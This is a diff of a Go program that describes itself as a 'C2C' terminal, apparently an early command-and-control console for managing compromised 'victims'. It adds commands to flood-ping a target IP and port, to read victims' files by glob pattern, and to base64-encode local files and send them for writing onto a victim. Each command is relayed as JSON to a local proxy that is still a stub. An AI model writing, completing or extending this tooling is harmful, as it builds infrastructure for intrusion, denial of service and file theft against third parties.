@@ -2,33 +2,29 @@ package main
 
 import (
 	"bufio"
-	"errors"
+	"bytes"
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
+	"io"
 	"net/http"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
-	"strconv"
 	"strings"
 	"time"
 
-	"github.com/gin-gonic/gin"
 	"github.com/olekukonko/tablewriter"
 )
 
 // Edit later
-type victim struct {
-	ID   string `json:"id"`
-	Ip   string `json:"ip"`
-	User string `json:"user"`
-	Port string `json:"port"`
+type comData struct {
+	Cmd  string `json:"cmd"`
+	Data string `json:"data"`
 }
 
-// Sample data
-var victims = []victim{
-	{ID: "1", Ip: "127.23.44", User: "Fred", Port: ""},
-	{ID: "2", Ip: "127.23.43", User: "bro", Port: "1988"},
-}
+const proxyURL = "http://localhost:8888/proxy"
 
 type option struct {
 	Cmd        string
@@ -45,53 +41,10 @@ var options = []option{
 	{"/help", 0, specificHelp},
 	{"/clear", 0, CallClear},
 	{"/exit", 0, exitFunction},
-	{"/whoami", 0, whoami},
-	{"/list", 0, victimList},
-	{"/floodping", 2, floodping},
-	{"/supercat", 0, nil},
-	{"/writefile", 0, victimList},
-}
-
-// lists victims
-func getVictims(c *gin.Context) {
-	c.IndentedJSON(http.StatusOK, victims)
-
-}
-
-// makes a new veictim
-func createVictim(c *gin.Context) {
-	var newVictim victim
-
-	if err := c.BindJSON(&newVictim); err != nil {
-		return
-	}
-
-	victims = append(victims, newVictim)
-	c.IndentedJSON(http.StatusCreated, newVictim)
-
-}
-
-func getVictimById(id string) (*victim, error) {
-	for i, b := range victims {
-		if b.ID == id {
-			return &victims[i], nil
-		}
-	}
-
-	return nil, errors.New("not found")
-}
-
-// Searches for victims in list
-func VictimById(c *gin.Context) {
-	id := c.Param("id")
-	victim, err := getVictimById(id)
-
-	if err != nil {
-		c.IndentedJSON(http.StatusNotFound, gin.H{"message": "victim not found."})
-		return
-	}
-
-	c.IndentedJSON(http.StatusOK, victim)
+	{"/list", 0, nil},
+	{"/floodping", -1, floodping},
+	{"/supercat", -1, supercat},
+	{"/writefile", -1, writefile},
 }
 
 // menu banner
@@ -113,21 +66,148 @@ func displayMenu() {
 
 func floodping(params ...interface{}) {
 	paramsForFloodPing, ok1 := params[0].([]string)
-	if !(ok1) {
+	if !ok1 || len(paramsForFloodPing) < 2 {
+		fmt.Println("floodping requires a IP and port")
 		return
 	}
-	ip := paramsForFloodPing[0]
-	port, err := strconv.Atoi(paramsForFloodPing[1])
+	ipport := paramsForFloodPing[0] + ":" + paramsForFloodPing[1]
+
+	data := comData{
+		Cmd:  "floodping",
+		Data: ipport,
+	}
+
+	jsondata, err := json.Marshal(data)
+
 	if err != nil {
-		// Handle error if conversion fails
-		fmt.Println("Error converting string to int:", err)
+		fmt.Println("There was an error: ", err)
 		return
 	}
-	fmt.Printf("Nothing yet but here is ip and port %s:%d\n", ip, port)
+
+	response, err := http.Post(proxyURL, "application/json", bytes.NewBuffer(jsondata))
+
+	if err != nil {
+		fmt.Println("There was an error: ", err)
+		return
+	}
+
+	defer response.Body.Close()
+
+	if response.StatusCode == http.StatusOK {
+		fmt.Println("Response success:", response.Status)
+	} else {
+		fmt.Println("Response Failed:", response.Status)
+	}
+
+}
+
+func supercat(params ...interface{}) {
+	paramsForSupercat, ok1 := params[0].([]string)
+	if !ok1 || len(paramsForSupercat) < 1 {
+		fmt.Println("supercat requires at least 1 file pattern")
+		return
+	}
+	fileglob := paramsForSupercat[0]
+
+	data := comData{
+		Cmd:  "supercat",
+		Data: fileglob,
+	}
+
+	jsondata, err := json.Marshal(data)
+
+	if err != nil {
+		fmt.Println("There was an error: ", err)
+		return
+	}
+
+	response, err := http.Post(proxyURL, "application/json", bytes.NewBuffer(jsondata))
+
+	if err != nil {
+		fmt.Println("There was an error: ", err)
+		return
+	}
+
+	defer response.Body.Close()
+
+	if response.StatusCode == http.StatusOK {
+		fmt.Println("Response success:", response.Status)
+	} else {
+		fmt.Println("Response Failed:", response.Status)
+	}
+
+}
+
+func writefile(params ...interface{}) {
+	paramsWritefile, ok := params[0].([]string)
+	if !ok || len(paramsWritefile) < 1 {
+		fmt.Println("writefile requires at least 1 file filename")
+		return
+	}
+
+	type filePayload struct {
+		Filename string `json:"filename"`
+		Content  string `json:"content"`
+	}
+
+	filesData := []filePayload{}
+
+	for _, filename := range paramsWritefile {
+		contents, err := os.ReadFile(filename)
+		if err != nil {
+			fmt.Printf("Can't read %s, error: %v\n", filename, err)
+			continue
+		}
+		filesData = append(filesData, filePayload{
+			Filename: filepath.Base(filename),
+			Content:  base64.StdEncoding.EncodeToString(contents),
+		})
+	}
+
+	data := map[string]interface{}{
+		"cmd":  "writefile",
+		"file": filesData,
+	}
+
+	jsondata, err := json.Marshal(data)
+	if err != nil {
+		fmt.Println("There is an error:", err)
+		return
+	}
+
+	response, err := http.Post(proxyURL, "application/json", bytes.NewBuffer(jsondata))
+	if err != nil {
+		fmt.Println("There is an error:", err)
+		return
+	}
+
+	defer response.Body.Close()
+
+	if response.StatusCode == http.StatusOK {
+		fmt.Println("Response success:", response.Status)
+	} else {
+		fmt.Println("Response Failed:", response.Status)
+	}
+}
+
+func proxyHandler(w http.ResponseWriter, r *http.Request) {
+
+	fmt.Println("Message recieved from: ", r.Host)
+
+	message, err := io.ReadAll(r.Body)
+	if err != nil {
+		fmt.Println("There was an error: ", err)
+		return
+	}
+
+	defer r.Body.Close()
+
+	fmt.Println("Message: ", string(message))
+
 }
 
 // prints when an invalid command is entered
-func genericHelp(params ...interface{}) {
+func genericHelp() {
 	fmt.Println("Invalid Command, use the /help command for details of all the commands")
 }
 
@@ -145,32 +225,15 @@ func specificHelp(params ...interface{}) {
 	table.Append([]string{"", "", ""})
 	table.Append([]string{"/exit", "None", "Safely exit the C2C terminal application"})
 	table.Append([]string{"", "", ""})
-	table.Append([]string{"/whoami", "None", "Returns your device details"})
+	table.Append([]string{"/list", "None", "Curently still in progress"})
 	table.Append([]string{"", "", ""})
-	table.Append([]string{"/list", "None", "Lists all victims currently infected"})
+	table.Append([]string{"/floodping", "IP, Port", "floodping for victim"})
 	table.Append([]string{"", "", ""})
-	table.Append([]string{"/floodping", "IP, Port", "does something i think"})
+	table.Append([]string{"/supercat", "file pattern", "cats victims file"})
 	table.Append([]string{"", "", ""})
-	table.Append([]string{"/supercat", "TBD", "something else haha"})
-	table.Append([]string{"", "", ""})
-	table.Append([]string{"/writefile", "TBD", "hate this command"})
+	table.Append([]string{"/writefile", "file", "write a file to the vicitim"})
 
 	// Render the table
-	table.Render()
-}
-
-// just filler command
-func whoami(params ...interface{}) {
-	fmt.Println("This is just filler, but I'm Steve from minecraft")
-}
-
-// Displays vicitim list
-func victimList(params ...interface{}) {
-	table := tablewriter.NewWriter(os.Stdout)
-	table.SetHeader([]string{"ID", "IP", "User", "Port"})
-	for _, v := range victims {
-		table.Append([]string{v.ID, v.Ip, v.User, v.Port})
-	}
 	table.Render()
 }
 
@@ -196,6 +259,9 @@ func Handler() {
 	// Read the user input
 	scanner.Scan()
 	userInput := scanner.Text()
+	if userInput == "" {
+		return
+	}
 	//finds the end of the initial command
 	spaceIndex := strings.Index(userInput, " ")
 	if spaceIndex == -1 {
@@ -210,7 +276,7 @@ func Handler() {
 	for _, b := range options {
 		//enter only if command is a real command
 		if b.Cmd == command {
-			if hasParamCount(cap(commandParamList), b.ParamCount) {
+			if hasParamCount(len(commandParamList), b.ParamCount) {
 				//pass all command parameters (of any size)
 				b.Action(commandParamList)
 				return
@@ -224,7 +290,7 @@ func Handler() {
 }
 
 func hasParamCount(count int, target int) bool {
-	return count == target
+	return count == target || target == -1
 }
 
 // code snippet taken from https://stackoverflow.com/questions/22891644/how-can-i-clear-the-terminal-screen-in-go
@@ -253,22 +319,18 @@ func CallClear(params ...interface{}) {
 	}
 }
 
-//	============================
-// 	Use goCurl? or other options
-//	Use curl to get information from victims?
-//	============================
-
-//	==========================
-
 // runs in a goroutine
 func startServer() {
-	router := gin.Default()
-	router.GET("/victims", getVictims)
-	router.GET("/victims/:id", VictimById)
-	router.POST("/createvictim", createVictim)
+
+	http.HandleFunc("/proxy", proxyHandler)
 
 	fmt.Println("Running on localhost:8888")
-	router.Run("localhost:8888")
+
+	err := http.ListenAndServe(":8888", nil)
+	if err != nil {
+		fmt.Println("The Server failed to run:", err)
+	}
+
 }
 
 // runs in a goroutine
